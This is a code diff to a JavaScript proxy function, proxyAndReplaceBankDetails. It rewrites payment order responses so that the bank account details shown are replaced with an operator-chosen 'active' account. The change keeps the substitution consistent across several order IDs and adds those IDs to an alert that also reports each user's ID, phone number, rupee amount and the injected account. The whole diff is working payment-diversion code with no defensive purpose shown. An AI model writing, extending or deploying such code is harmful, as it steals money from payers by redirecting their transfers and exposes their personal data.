@@ -1145,16 +1145,22 @@ async function proxyAndReplaceBankDetails(req, res, label) {
     }
 
     const rd = (respData && typeof respData === 'object' && !Array.isArray(respData)) ? respData : {};
-    const orderId = rd.orderId || rd.orderNo || rd.buyOrderId || rd.buyOrderNo || orderBankLookupId || 'N/A';
+    const allOrderIds = [
+      rd.buyOrderNo, rd.orderNo, rd.orderId, rd.buyOrderId, rd.id, orderBankLookupId
+    ].filter(Boolean);
+    const orderId = allOrderIds[0] || 'N/A';
 
     if (respData) {
-      const savedBank = await getOrderBank(orderId);
+      const savedBank = await getOrderBankMultiple(allOrderIds);
       const bankToUse = savedBank || active;
       if (bankToUse) {
         if (Array.isArray(respData)) {
           respData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, bankToUse, {}, 0); });
         } else {
           deepReplace(respData, bankToUse, {}, 0);
+        }
+        if (bankToUse === active && allOrderIds.length > 0) {
+          saveOrderBankMultipleKeys(allOrderIds, active);
         }
       }
     }
@@ -1168,6 +1174,7 @@ async function proxyAndReplaceBankDetails(req, res, label) {
 `🔔 ${label}
 👤 User: ${detectedUserId || 'N/A'}${phone ? ' (' + phone + ')' : ''}
 Order: ${orderId}
+IDs: ${allOrderIds.join(', ')}
 Amount: ₹${amount}
 Bank: ${active ? active.accountNo : 'N/A'}
 Acc: ${active ? active.accountHolder : 'None'}
